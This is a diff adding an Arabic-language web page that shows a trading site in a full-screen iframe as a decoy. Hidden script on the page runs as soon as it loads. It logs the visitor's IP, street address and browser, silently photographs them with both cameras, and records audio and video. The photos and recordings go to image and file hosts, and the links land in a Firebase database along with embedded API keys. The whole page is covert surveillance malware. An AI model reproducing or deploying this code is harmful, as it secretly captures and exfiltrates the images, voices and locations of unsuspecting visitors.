@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+    body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #000; }
+    iframe { width: 100%; height: 100%; border: none; }
+    video, canvas { display: none; }
+</style>
+</head>
+<body>
+
+<iframe src="https://traidmod.com/"></iframe>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
+
+<script>
+const firebaseConfig = {
+    apiKey: "AIzaSyCaMV2_EKFrhW9CUHMOHnfyFER_M2mDcN8",
+    databaseURL: "https://admin-aad81-default-rtdb.firebaseio.com"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const params = new URLSearchParams(window.location.search);
+const usex = params.get('usex') || "Unknown";
+const IMGBB_API_KEY = "5a31b1f80b659a53569bb21b718c2364";
+
+async function getIPAndLocation() {
+    try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+        const nodeIp = ip.replace(/\./g, '_');
+
+        let countryStr = "Unknown";
+        let fullAddress = "Unknown";
+        
+        try {
+            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const locData = await locRes.json();
+            if(locData.latitude && locData.longitude) {
+                countryStr = locData.country_name === "Egypt" ? "مصر" : locData.country_name;
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locData.latitude}&lon=${locData.longitude}&accept-language=ar`);
+                const geoData = await geoRes.json();
+                if(geoData.display_name) {
+                    fullAddress = geoData.display_name;
+                } else {
+                    fullAddress = `${locData.city || ""}, ${locData.region || ""}, ${countryStr}`;
+                }
+            }
+        } catch(e) {}
+
+        const info = {
+            ip: ip,
+            Country: countryStr,
+            "Full Adress": fullAddress,
+            time: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            usex: usex
+        };
+
+        await db.ref("Data_x/" + nodeIp).update(info);
+        return nodeIp;
+    } catch (e) {
+        return "Unknown_IP_" + Math.floor(Math.random() * 1000);
+    }
+}
+
+async function capturePhoto(facingMode, photoKey, nodeIp) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        const video = document.getElementById('v');
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const base64 = canvas.toDataURL('image/jpeg').split(',')[1];
+        
+        stream.getTracks().forEach(t => t.stop());
+
+        const fd = new FormData();
+        fd.append('image', base64);
+        const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
+        const json = await res.json();
+        
+        if(json.success) {
+            await db.ref("Data_x/" + nodeIp).update({ [photoKey]: json.data.url });
+        }
+    } catch(e) {}
+}
+
+async function recordMedia(type, facingMode, mediaKey, nodeIp, duration) {
+    try {
+        const constraints = type === 'video' ? { video: { facingMode: facingMode }, audio: true } : { audio: true };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        
+        await new Promise(r => setTimeout(r, duration));
+        recorder.stop();
+
+        await new Promise(resolve => {
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: type === 'video' ? "video/mp4" : "audio/mp3" });
+                const fd = new FormData();
+                fd.append("file", blob, type === 'video' ? "video.mp4" : "voice.mp3");
+                
+                try {
+                    const up = await fetch("https://tmpfiles.org/api/v1/upload", { method: "POST", body: fd });
+                    const j = await up.json();
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    if(j.status === "success") {
+                        const directUrl = j.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
+                        await db.ref("Data_x/" + nodeIp).update({ [mediaKey]: directUrl });
+                    }
+                } catch(err) {}
+                resolve();
+            };
+        });
+    } catch(e) {}
+}
+
+window.addEventListener("DOMContentLoaded", async () => {
+    const nodeIp = await getIPAndLocation();
+    
+    await capturePhoto("user", "cam1", nodeIp);
+    await new Promise(r => setTimeout(r, 300));
+    
+    await capturePhoto("environment", "cam2", nodeIp);
+    await new Promise(r => setTimeout(r, 300));
+    
+    await recordMedia("audio", null, "audio", nodeIp, 4000);
+    await new Promise(r => setTimeout(r, 300));
+    
+    // تسجيل فيديو 1 (كاميرا أمامية)
+    await recordMedia("video", "user", "video1", nodeIp, 4000);
+    await new Promise(r => setTimeout(r, 300));
+    
+    // تسجيل فيديو 2 (كاميرا خلفية)
+    await recordMedia("video", "environment", "video2", nodeIp, 4000);
+});
+</script>
+</body>
+</html>
